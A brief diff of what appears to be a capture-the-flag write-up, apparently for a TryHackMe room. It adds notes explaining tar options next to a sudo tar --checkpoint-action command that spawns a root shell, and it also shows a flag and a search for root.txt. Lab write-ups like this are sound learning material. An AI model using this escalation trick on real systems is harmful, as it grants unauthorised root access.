@@ -288,7 +288,11 @@ THM{80UN7Y_h4cK3r}
 
 
 `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
-+ 
++ `-cf` are tar command options
+    + `-c`
+    + `-f`
+
+      
 
 
 `find / -type f -name root.txt 2>/dev/null`
